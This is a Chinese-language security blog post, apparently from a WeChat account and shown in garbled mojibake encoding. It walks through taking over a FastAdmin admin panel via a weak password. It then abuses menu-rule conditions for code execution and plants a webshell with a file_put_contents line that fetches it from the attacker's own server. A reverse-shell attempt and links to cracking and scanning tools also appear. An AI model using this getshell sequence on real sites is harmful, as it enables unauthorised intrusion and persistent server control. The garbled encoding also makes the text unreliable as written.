#  è®°ä¸€æ¬¡FastAdminåå°Getshell

culprit  [ æ©˜çŒ«å­¦å®‰å…¨ ](javascript:void\(0\);)

**æ©˜çŒ«å­¦å®‰å…¨** ![]()

å¾®ä¿¡å· gh_af700ee13397

åŠŸèƒ½ä»‹ç» æ¯æ—¥ä¸€å¹²è´§ğŸ™‚

____

___å‘è¡¨äº_

æ”¶å½•äºåˆé›† #ç½‘ç»œå®‰å…¨æŠ€æœ¯ 211ä¸ª

FastAdminä»‹ç»  
  
FastAdminæ˜¯åŸºäºThinkPHP5å’ŒBootstrapçš„æé€Ÿåå°å¼€å‘æ¡†æ¶ï¼ŒåŸºäºThinkPHPè¡Œä¸ºåŠŸèƒ½å®ç°çš„æ’ä»¶æœºåˆ¶ï¼Œæ‹¥æœ‰ä¸°å¯Œçš„æ’ä»¶å’Œæ‰©å±•ï¼Œå¯ç›´æ¥åœ¨çº¿å®‰è£…å¸è½½ã€‚åŸºäºå®Œå–„çš„Authæƒé™æ§åˆ¶ç®¡ç†ã€æ— é™çˆ¶å­çº§æƒé™åˆ†ç»„ã€å¯è‡ªç”±åˆ†é…å­çº§æƒé™ã€ä¸€ä¸ªç®¡ç†å‘˜å¯åŒæ—¶å±äºå¤šä¸ªç»„åˆ«ã€‚  
æµ‹è¯•è¿‡ç¨‹  
  
åœ¨æŸæ¬¡HVVçš„æ‰“ç‚¹è¿‡ç¨‹ä¸­ï¼Œå‘ç°æŸèµ„äº§ä¸ºFastAdminæ­å»ºã€‚ä¸‹å›¾ä¸ºFastAdminçš„æŠ¥é”™é¡µé¢ï¼Œæ ¹æ®ç»éªŒå¯åˆ¤æ–­è¯¥ç½‘ç«™ä¸ºFastAdminæ­å»ºã€‚![]()  
è¾“å…¥admin.phpè¿›å…¥åå°ç™»å½•é¡µé¢ï¼Œå¼±å£ä»¤è¿›å…¥åå°ã€‚![]()![]()  
è¿›å…¥åå°æ‰¾åŠŸèƒ½ç‚¹getshellã€‚åå°é»˜è®¤ä¼šæœ‰æ’ä»¶ç®¡ç†åŠŸèƒ½ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨åå°æ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®æ’ä»¶ç®¡ç†çš„åœ°å€

  * 

    
    
    /admin/addon?ref=addtabs

![]()  
ç†è®ºä¸Šç¦»çº¿å®‰è£… Fileixæ–‡ä»¶ç®¡ç†å™¨ ï¼Œç„¶åä¸Šä¼ ä¸€å¥è¯æœ¨é©¬å°±å¯ä»¥getshellï¼Œä½†æ˜¯å¾ˆå¯æƒœå¤±è´¥äº†ã€‚![]()  
æ¥ç€ç¿»åå°ï¼Œå‘ç°æœ‰å®šæ—¶ä»»åŠ¡åŠŸèƒ½ï¼Œå°è¯•åå¼¹shellï¼Œå†™å…¥åå¼¹shellçš„è¯­å¥åï¼Œåœ¨æœåŠ¡å™¨ä¸Šncç›‘å¬ç­‰å¾…å›è¿ï¼Œä½†æ˜¯å‘ç°å¹¶æ²¡æœ‰æ‰§è¡Œã€‚![]()  
åé¢ä¸€çœ‹ä¹‹å‰ç®¡ç†å‘˜è®¾ç½®è¿‡çš„å®šæ—¶ä»»åŠ¡ä¹Ÿæ²¡æœ‰æ‰§è¡Œè¿‡ï¼Œå¤±è´¥ï¼![]()  
ç»§ç»­ç¿»åå°ï¼Œå‘ç°åœ¨èœå•è§„åˆ™ä¸­å¯ä»¥åˆ›å»ºè§„åˆ™æ¡ä»¶ï¼Œå°è¯•åœ¨åŠŸèƒ½ç‚¹ä¸­å†™å…¥phpinfo()ã€‚å¿…é¡»å†™åœ¨æƒé™ç®¡ç†ä¸­ï¼ï¼ï¼![]()  
ç„¶åæ¥åˆ°ç®¡ç†å‘˜ç®¡ç†ä¸­ï¼Œæ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜ã€‚æ‰€å±ç»„åˆ«å¿…é¡»ä¸ºäºŒçº§ç®¡ç†å‘˜ç»„ï¼ï¼ï¼![]()  
æ·»åŠ å®Œæˆä¹‹åï¼Œé‡æ–°ç”¨æ–°æ·»åŠ çš„è´¦æˆ·ç™»å½•åå°ï¼Œå¯ä»¥å‘ç°phpinfo()è¢«æˆåŠŸæ‰§è¡Œã€‚![]()  
é€šè¿‡æœç´¢$_SERVER[â€˜DOCUMENT_ROOTâ€™]è·å–ç½‘ç«™æ ¹ç›®å½•ï¼Œä¸º/www/wwwroot/xxxxxxxxx/![]()  
æ‰¾åˆ°æ ¹è·¯å¾„åæ³¨é”€è´¦æˆ·ï¼Œå‡†å¤‡ä¸€ä¸ªwebshellæœ¨é©¬åä¸º1.phpï¼Œæ”¾åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œä½¿ç”¨pythonå¯åŠ¨ä¸€ä¸ªä¸´æ—¶webã€‚

  * 

    
    
    python3 -m http.server 8080

![]()  
åœ¨å›åˆ°ç®¡ç†åå°å½“ä¸­ï¼Œåœ¨åŒæ ·çš„ä½ç½®å†™å…¥å¦‚ä¸‹è¯­å¥ï¼Œå°†è¿œç¨‹æœåŠ¡å™¨çš„webshellæœ¨é©¬ä¸‹è½½åˆ°ç½‘ç«™æ ¹ç›®å½•ã€‚

  * 

    
    
    file_put_contents('/www/wwwroot/xxxxxxxxx/shell.php',file_get_contents('ä¸´æ—¶webåœ°å€/1.php'))

![]()  
ä¿å­˜å®Œæˆåï¼Œå†æ¬¡ä½¿ç”¨åˆšæ‰æ–°åˆ›å»ºçš„ç”¨æˆ·ç™»å½•![]()![]()  
webshellæœ¨é©¬å·²è¢«æˆåŠŸå†™å…¥ã€‚![]()  
æ€»ç»“  
  
åœ¨æ‰“ç‚¹è¿‡ç¨‹ä¸­ï¼Œ é€šè¿‡æŒ‡çº¹è¯†åˆ«è½¯ä»¶è¿›è¡ŒæŒ‡çº¹è¯†åˆ«è¿›è¡Œç›¸åº”çš„æ¼æ´åˆ©ç”¨ï¼Œåœ¨æœªè¯†åˆ«å‡ºæŒ‡çº¹çš„éœ€äººå·¥åˆ¤æ–­ï¼Œæ ¹æ®æŠ¥é”™é¡µé¢çš„æ ·å¼è¯†åˆ«æŒ‡çº¹ä¸€ç§è¾ƒå¥½çš„æ–¹æ³•ã€‚  
  
æ•´ä½“æ‰“ç‚¹è¿‡ç¨‹ï¼šæµè§ˆç½‘ç«™â€”>å‘ç°æŠ¥é”™é¡µé¢æŒ‡çº¹ä¸ºFastAdminâ€”>é€šè¿‡å¼±å£ä»¤è¿›å…¥åå°â€”>è§„åˆ™æ¡ä»¶ä¸­å†™å…¥phpinfo()â€”>è·å¾—ç½‘ç«™æ ¹ç›®å½•â€”>è§„åˆ™æ¡ä»¶ä¸­å†™å…¥webshellã€‚  

  *   * 

    
    
    æ–‡ç« æ¥æºï¼šculpritï¼ˆè¯­é›€ï¼‰åŸæ–‡åœ°å€ï¼šhttps://www.yuque.com/culprit/note/nyvtuz

  
å¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»åˆ é™¤

 **æ¨èé˜…è¯»**

[å®æˆ˜|è®°ä¸€æ¬¡å¥‡å¦™çš„æ–‡ä»¶ä¸Šä¼ getshell](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495718&idx=1&sn=e25bcb693e5a50988f4a7ccd4552c2e2&chksm=c04d7718f73afe0e282c778af8587446ff48cd88422701126b0b21fa7f5027c3cde89e0c3d6d&scene=21#wechat_redirect)  
[ã€Œ è¶…è¯¦ç»† | åˆ†äº«
ã€æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•è¿›è¡Œå†…ç½‘æ¸—é€](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495694&idx=1&sn=502c812024302566881bad63e01e98cb&chksm=c04d7730f73afe267fd4ef57fb3c74416b20db0ba8e6b03f0c1fd7785348860ccafc15404f24&scene=21#wechat_redirect)  
[ç¥å…µåˆ©å™¨ | siusiu-
æ¸—é€å·¥å…·ç®¡ç†å¥—ä»¶](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495385&idx=1&sn=4d2d8456c27e058a30b147cb7ed51ab1&chksm=c04d69e7f73ae0f11b382cddddb4a07828524a53c0c2987d572967371470a48ad82ae96e7eb1&scene=21#wechat_redirect)  
[ä¸€æ¬¾åŠŸèƒ½å…¨é¢çš„XSSæ‰«æå™¨](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495361&idx=1&sn=26077792908952c6279deeb2a19ebe37&chksm=c04d69fff73ae0e9f2e03dd8e347f35d660a7fd3d51b0f5e45c8c64afc90c0ee34c4251f9c80&scene=21#wechat_redirect)  
[å®æˆ˜ |
ä¸€æ¬¡åˆ©ç”¨å“¥æ–¯æ‹‰é©¬ç»•è¿‡å®å¡”waf](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495331&idx=1&sn=94b63a0ec82de62191f0911a39b63b7a&chksm=c04d699df73ae08b946e4cf53ceea1bc7591dad0ce18a7ccffed33aa52adccb18b4b1aa78f4c&scene=21#wechat_redirect)  
[BurpCrypto:
ä¸‡èƒ½ç½‘ç«™å¯†ç çˆ†ç ´æµ‹è¯•å·¥å…·](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495253&idx=1&sn=d4c46484a44892ef7235342d2763e6be&chksm=c04d696bf73ae07d0c16cff3317f6eb847df2251a9f2332bbe7de56cb92da53b206cd4100210&scene=21#wechat_redirect)  
[å¿«é€Ÿç­›é€‰çœŸå®IPå¹¶æ•´ç†ä¸ºCæ®µ --
æ£±çœ¼](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495199&idx=1&sn=74c00ba76f4f6726107e2820daf7817a&chksm=c04d6921f73ae037efe92e051ac3978068d29e76b09cf5b0b501452693984f96baa9436457e4&scene=21#wechat_redirect)  
[è‡ªåŠ¨æ¢æµ‹ç«¯å£é¡ºä¾¿çˆ†ç ´å·¥å…·t14m4t](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495141&idx=1&sn=084e8231c0495e91d1bd841e3f43b61c&chksm=c04d6adbf73ae3cdbb0a4cc754f78228772d6899b94d0ea6bb735b4b5ca03c51e7715b43d0af&scene=21#wechat_redirect)  
[æ¸—é€å·¥å…·ï½œæ— çŠ¶æ€å­åŸŸåçˆ†ç ´å·¥å…·ï¼ˆ1ç§’æ‰«160ä¸‡ä¸ªå­åŸŸï¼‰](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495099&idx=1&sn=385764328aff5ec49acddab380721af0&chksm=c04d6a85f73ae393ffab22021839f5baec3802d495c34fb364cbdd9b7cb0cf642851e9527ba7&scene=21#wechat_redirect)  
 **æŸ¥çœ‹æ›´å¤šç²¾å½©å†…å®¹ï¼Œè¿˜è¯·å…³æ³¨** **æ©˜çŒ«å­¦å®‰å…¨ï¼š** **æ¯æ—¥åšæŒå­¦ä¹ ä¸åˆ†äº«ï¼Œè§‰å¾—æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©å¯åœ¨åº•éƒ¨ç»™ç‚¹ä¸ªâ€œ** **å†çœ‹ â€**

é¢„è§ˆæ—¶æ ‡ç­¾ä¸å¯ç‚¹

å¾®ä¿¡æ‰«ä¸€æ‰«  
å…³æ³¨è¯¥å…¬ä¼—å·

[çŸ¥é“äº†](javascript:;)

å¾®ä¿¡æ‰«ä¸€æ‰«  
ä½¿ç”¨å°ç¨‹åº

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

ï¼š ï¼Œ ã€‚   è§†é¢‘ å°ç¨‹åº èµ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆèµ åœ¨çœ‹ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆåœ¨çœ‹

